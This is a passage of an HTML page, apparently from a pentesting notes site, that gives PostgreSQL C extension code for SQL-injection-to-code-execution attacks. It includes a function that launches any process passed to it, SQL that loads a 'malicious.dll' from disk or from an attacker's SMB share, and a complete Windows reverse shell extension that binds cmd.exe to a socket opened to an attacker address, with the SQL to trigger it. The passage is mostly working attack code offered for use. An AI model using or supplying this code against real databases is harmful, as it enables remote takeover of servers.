+</span><span id="__span-52-28"><a id="__codelineno-52-28" name="__codelineno-52-28" href="#__codelineno-52-28"></a>
+</span><span id="__span-52-29"><a id="__codelineno-52-29" name="__codelineno-52-29" href="#__codelineno-52-29"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">instances</span><span class="p">;</span><span class="w"> </span><span class="n">c</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-52-30"><a id="__codelineno-52-30" name="__codelineno-52-30" href="#__codelineno-52-30"></a><span class="w">        </span><span class="cm">/*launch the process passed in the first parameter*/</span>
+</span><span id="__span-52-31"><a id="__codelineno-52-31" name="__codelineno-52-31" href="#__codelineno-52-31"></a><span class="w">        </span><span class="n">ShellExecute</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GET_STR</span><span class="p">(</span><span class="n">PG_GETARG_TEXT_P</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+</span><span id="__span-52-32"><a id="__codelineno-52-32" name="__codelineno-52-32" href="#__codelineno-52-32"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-52-33"><a id="__codelineno-52-33" name="__codelineno-52-33" href="#__codelineno-52-33"></a><span class="w">    </span><span class="n">PG_RETURN_VOID</span><span class="p">();</span>
+</span><span id="__span-52-34"><a id="__codelineno-52-34" name="__codelineno-52-34" href="#__codelineno-52-34"></a><span class="p">}</span>
+</span><span id="__span-52-35"><a id="__codelineno-52-35" name="__codelineno-52-35" href="#__codelineno-52-35"></a>
+</span><span id="__span-52-36"><a id="__codelineno-52-36" name="__codelineno-52-36" href="#__codelineno-52-36"></a><span class="cm">/* Executing this on PostgreSQL query*/</span>
+</span><span id="__span-52-37"><a id="__codelineno-52-37" name="__codelineno-52-37" href="#__codelineno-52-37"></a><span class="cm">/* create or replace function test(text, integer) returns void as $$C:\malicious.dll$$, $$malicious$$ language C strict;</span>
+</span><span id="__span-52-38"><a id="__codelineno-52-38" name="__codelineno-52-38" href="#__codelineno-52-38"></a><span class="cm">SELECT test($$calc.exe$$, 1); */</span>
+</span><span id="__span-52-39"><a id="__codelineno-52-39" name="__codelineno-52-39" href="#__codelineno-52-39"></a><span class="cm">/* If remotely then on the Kali: sudo impacket-smbserver malicious_share /home/kali/share/</span>
+</span><span id="__span-52-40"><a id="__codelineno-52-40" name="__codelineno-52-40" href="#__codelineno-52-40"></a><span class="cm">/* CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.1.2\malicious_share\malicious.dll$$, $$malicious$$ LANGUAGE C STRICT;</span>
+</span><span id="__span-52-41"><a id="__codelineno-52-41" name="__codelineno-52-41" href="#__codelineno-52-41"></a><span class="cm">SELECT remote_test($$calc.exe$$, 1); */</span>
+</span></code></pre></div></li>
+<li>Reverse shell (For Windows)
+    <div class="language-c highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="cp">#define _WINSOCK_DEPRECATED_NO_WARNINGS</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;postgres.h&quot;</span>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;fmgr.h&quot;</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;utils/geo_decls.h&quot;</span>
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;winsock2.h&gt;</span>
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;utils/builtins.h&quot;</span>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a><span class="cp">#pragma comment(lib, &quot;ws2_32&quot;)</span>
+</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a>
+</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a><span class="cp">#ifdef PG_MODULE_MAGIC</span>
+</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a><span class="n">PG_MODULE_MAGIC</span><span class="p">;</span>
+</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a><span class="cp">#endif</span>
+</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a>
+</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a><span class="cm">/* Add a prototype marked PGDLLEXPORT */</span>
+</span><span id="__span-53-16"><a id="__codelineno-53-16" name="__codelineno-53-16" href="#__codelineno-53-16"></a><span class="n">PGDLLEXPORT</span><span class="w"> </span><span class="n">Datum</span><span class="w"> </span><span class="n">connect_back</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">);</span>
+</span><span id="__span-53-17"><a id="__codelineno-53-17" name="__codelineno-53-17" href="#__codelineno-53-17"></a><span class="n">PG_FUNCTION_INFO_V1</span><span class="p">(</span><span class="n">connect_back</span><span class="p">);</span>
+</span><span id="__span-53-18"><a id="__codelineno-53-18" name="__codelineno-53-18" href="#__codelineno-53-18"></a>
+</span><span id="__span-53-19"><a id="__codelineno-53-19" name="__codelineno-53-19" href="#__codelineno-53-19"></a><span class="n">WSADATA</span><span class="w"> </span><span class="n">wsaData</span><span class="p">;</span>
+</span><span id="__span-53-20"><a id="__codelineno-53-20" name="__codelineno-53-20" href="#__codelineno-53-20"></a><span class="n">SOCKET</span><span class="w"> </span><span class="n">s1</span><span class="p">;</span>
+</span><span id="__span-53-21"><a id="__codelineno-53-21" name="__codelineno-53-21" href="#__codelineno-53-21"></a><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">hax</span><span class="p">;</span>
+</span><span id="__span-53-22"><a id="__codelineno-53-22" name="__codelineno-53-22" href="#__codelineno-53-22"></a><span class="kt">char</span><span class="w"> </span><span class="n">ip_addr</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span><span id="__span-53-23"><a id="__codelineno-53-23" name="__codelineno-53-23" href="#__codelineno-53-23"></a><span class="n">STARTUPINFO</span><span class="w"> </span><span class="n">sui</span><span class="p">;</span>
+</span><span id="__span-53-24"><a id="__codelineno-53-24" name="__codelineno-53-24" href="#__codelineno-53-24"></a><span class="n">PROCESS_INFORMATION</span><span class="w"> </span><span class="n">pi</span><span class="p">;</span>
+</span><span id="__span-53-25"><a id="__codelineno-53-25" name="__codelineno-53-25" href="#__codelineno-53-25"></a>
+</span><span id="__span-53-26"><a id="__codelineno-53-26" name="__codelineno-53-26" href="#__codelineno-53-26"></a><span class="n">Datum</span>
+</span><span id="__span-53-27"><a id="__codelineno-53-27" name="__codelineno-53-27" href="#__codelineno-53-27"></a><span class="nf">connect_back</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">)</span>
+</span><span id="__span-53-28"><a id="__codelineno-53-28" name="__codelineno-53-28" href="#__codelineno-53-28"></a><span class="p">{</span>
+</span><span id="__span-53-29"><a id="__codelineno-53-29" name="__codelineno-53-29" href="#__codelineno-53-29"></a>
+</span><span id="__span-53-30"><a id="__codelineno-53-30" name="__codelineno-53-30" href="#__codelineno-53-30"></a><span class="w">    </span><span class="cm">/* convert C string to text pointer */</span>
+</span><span id="__span-53-31"><a id="__codelineno-53-31" name="__codelineno-53-31" href="#__codelineno-53-31"></a><span class="cp">#define GET_TEXT(cstrp) \</span>
+</span><span id="__span-53-32"><a id="__codelineno-53-32" name="__codelineno-53-32" href="#__codelineno-53-32"></a><span class="cp">   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))</span>
+</span><span id="__span-53-33"><a id="__codelineno-53-33" name="__codelineno-53-33" href="#__codelineno-53-33"></a>
+</span><span id="__span-53-34"><a id="__codelineno-53-34" name="__codelineno-53-34" href="#__codelineno-53-34"></a><span class="w">    </span><span class="cm">/* convert text pointer to C string */</span>
+</span><span id="__span-53-35"><a id="__codelineno-53-35" name="__codelineno-53-35" href="#__codelineno-53-35"></a><span class="cp">#define GET_STR(textp) \</span>
+</span><span id="__span-53-36"><a id="__codelineno-53-36" name="__codelineno-53-36" href="#__codelineno-53-36"></a><span class="cp">  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))</span>
+</span><span id="__span-53-37"><a id="__codelineno-53-37" name="__codelineno-53-37" href="#__codelineno-53-37"></a>
+</span><span id="__span-53-38"><a id="__codelineno-53-38" name="__codelineno-53-38" href="#__codelineno-53-38"></a><span class="w">    </span><span class="n">WSAStartup</span><span class="p">(</span><span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wsaData</span><span class="p">);</span>
+</span><span id="__span-53-39"><a id="__codelineno-53-39" name="__codelineno-53-39" href="#__codelineno-53-39"></a><span class="w">    </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WSASocket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="w"> </span><span class="n">IPPROTO_TCP</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-53-40"><a id="__codelineno-53-40" name="__codelineno-53-40" href="#__codelineno-53-40"></a>
+</span><span id="__span-53-41"><a id="__codelineno-53-41" name="__codelineno-53-41" href="#__codelineno-53-41"></a>
+</span><span id="__span-53-42"><a id="__codelineno-53-42" name="__codelineno-53-42" href="#__codelineno-53-42"></a>
+</span><span id="__span-53-43"><a id="__codelineno-53-43" name="__codelineno-53-43" href="#__codelineno-53-43"></a><span class="w">    </span><span class="n">hax</span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span>
+</span><span id="__span-53-44"><a id="__codelineno-53-44" name="__codelineno-53-44" href="#__codelineno-53-44"></a><span class="w">    </span><span class="n">hax</span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">PG_GETARG_INT32</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+</span><span id="__span-53-45"><a id="__codelineno-53-45" name="__codelineno-53-45" href="#__codelineno-53-45"></a><span class="w">    </span><span class="n">hax</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="n">GET_STR</span><span class="p">(</span><span class="n">PG_GETARG_TEXT_P</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
+</span><span id="__span-53-46"><a id="__codelineno-53-46" name="__codelineno-53-46" href="#__codelineno-53-46"></a><span class="w">    </span><span class="cm">/*read documentation here:</span>
+</span><span id="__span-53-47"><a id="__codelineno-53-47" name="__codelineno-53-47" href="#__codelineno-53-47"></a><span class="cm">    https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect</span>
+</span><span id="__span-53-48"><a id="__codelineno-53-48" name="__codelineno-53-48" href="#__codelineno-53-48"></a><span class="cm">    which offered a pointer to here</span>
+</span><span id="__span-53-49"><a id="__codelineno-53-49" name="__codelineno-53-49" href="#__codelineno-53-49"></a><span class="cm">    https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2</span>
+</span><span id="__span-53-50"><a id="__codelineno-53-50" name="__codelineno-53-50" href="#__codelineno-53-50"></a><span class="cm">    */</span>
+</span><span id="__span-53-51"><a id="__codelineno-53-51" name="__codelineno-53-51" href="#__codelineno-53-51"></a>
+</span><span id="__span-53-52"><a id="__codelineno-53-52" name="__codelineno-53-52" href="#__codelineno-53-52"></a><span class="w">    </span><span class="n">WSAConnect</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">SOCKADDR</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">hax</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hax</span><span class="p">),</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-53-53"><a id="__codelineno-53-53" name="__codelineno-53-53" href="#__codelineno-53-53"></a>
+</span><span id="__span-53-54"><a id="__codelineno-53-54" name="__codelineno-53-54" href="#__codelineno-53-54"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sui</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sui</span><span class="p">));</span>
+</span><span id="__span-53-55"><a id="__codelineno-53-55" name="__codelineno-53-55" href="#__codelineno-53-55"></a><span class="w">    </span><span class="n">sui</span><span class="p">.</span><span class="n">cb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sui</span><span class="p">);</span>
+</span><span id="__span-53-56"><a id="__codelineno-53-56" name="__codelineno-53-56" href="#__codelineno-53-56"></a><span class="w">    </span><span class="n">sui</span><span class="p">.</span><span class="n">dwFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">STARTF_USESTDHANDLES</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">STARTF_USESHOWWINDOW</span><span class="p">);</span>
+</span><span id="__span-53-57"><a id="__codelineno-53-57" name="__codelineno-53-57" href="#__codelineno-53-57"></a><span class="w">    </span><span class="n">sui</span><span class="p">.</span><span class="n">hStdInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sui</span><span class="p">.</span><span class="n">hStdOutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sui</span><span class="p">.</span><span class="n">hStdError</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">s1</span><span class="p">;</span>
+</span><span id="__span-53-58"><a id="__codelineno-53-58" name="__codelineno-53-58" href="#__codelineno-53-58"></a>
+</span><span id="__span-53-59"><a id="__codelineno-53-59" name="__codelineno-53-59" href="#__codelineno-53-59"></a><span class="w">    </span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sui</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+</span><span id="__span-53-60"><a id="__codelineno-53-60" name="__codelineno-53-60" href="#__codelineno-53-60"></a><span class="w">    </span><span class="n">PG_RETURN_VOID</span><span class="p">();</span>
+</span><span id="__span-53-61"><a id="__codelineno-53-61" name="__codelineno-53-61" href="#__codelineno-53-61"></a><span class="p">}</span>
+</span><span id="__span-53-62"><a id="__codelineno-53-62" name="__codelineno-53-62" href="#__codelineno-53-62"></a><span class="cm">/*Executing this code*/</span>
+</span><span id="__span-53-63"><a id="__codelineno-53-63" name="__codelineno-53-63" href="#__codelineno-53-63"></a><span class="cm">/*create or replace function rev_shell(text, integer) returns void as $$C:\rev_shell.dll$$, $$connect_back$$ language C strict;*/</span>
+</span><span id="__span-53-64"><a id="__codelineno-53-64" name="__codelineno-53-64" href="#__codelineno-53-64"></a><span class="cm">/*SELECT rev_shell($$192.168.1.2$$,9000);*/</span>
+</span></code></pre></div></li>
+<li>For Linux[^6]</li>
+</ul>
+</li>
+</ul>
+<p>[^2]: <a href="https://pulsesecurity.co.nz/articles/postgres-sqli">Pulse Security</a>
+[^3]: <a href="./SQLi#Executing-commands-via-PostgreSQL-Extensions">Executing commands via PostgreSQL Extensions</a>
+[^4]: <a href="https://medium.com/coding-blocks/creating-user-database-and-adding-access-on-postgresql-8bfcd2f4a91e">Medium - Arnav Gupta - Creating user, database and adding access on PostgreSQL</a>
+[^5]: <a href="https://chartio.com/resources/tutorials/how-to-change-a-user-to-superuser-in-postgresql/">Chartio - Aj Welch - How to Change a User to Superuser in PostgreSQL</a>
+[^6]: <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions">HackTricks - RCE with PostgreSQL Extensions</a></p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/cloud/sqli.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
